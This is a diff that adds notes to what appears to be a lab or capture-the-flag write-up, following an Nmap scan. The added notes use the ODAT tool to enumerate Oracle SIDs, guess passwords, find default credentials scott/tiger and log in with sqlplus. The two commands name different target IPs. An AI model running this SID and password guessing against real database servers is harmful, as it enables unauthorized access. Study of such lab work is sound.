@@ -71,5 +71,18 @@ Host script results:
 
 Nmap done: 1 IP address (1 host up) scanned in 11.98 seconds
 
+installing odat
+
+we first enumerate sids then guess the password
+./odat.py sidguesser -s 10.129.84.231 -p 1521   
+./odat.py passwordguesser -s 10.129.95.188 -d XE  
+[+] Accounts found on 10.129.95.188:1521/sid:XE: 
+scott/tiger
+
+
+scott/tiger is a password
+
+sqlplus scott/tiger@10.129.95.188:1521/XE
+
 
 
